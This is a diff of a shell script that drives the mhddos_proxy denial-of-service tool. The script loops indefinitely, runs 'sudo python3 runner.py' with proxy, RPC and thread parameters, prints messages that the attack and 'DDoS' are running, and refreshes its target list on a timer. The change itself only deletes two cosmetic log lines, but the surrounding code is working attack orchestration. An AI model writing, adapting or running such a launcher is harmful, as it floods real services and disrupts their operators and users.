@@ -44,7 +44,6 @@ fi
 
 # Restart attacks and update targets list every 10 minutes (by default)
 while [ 1 == 1 ]
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;34m#####################################\033[0;0m\n"
 do	
 	cd ~/mhddos_proxy
 
@@ -134,7 +133,6 @@ do
             sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
-	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;34m#####################################\033[0;0m\n"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
    	sleep $restart_interval
 	clear
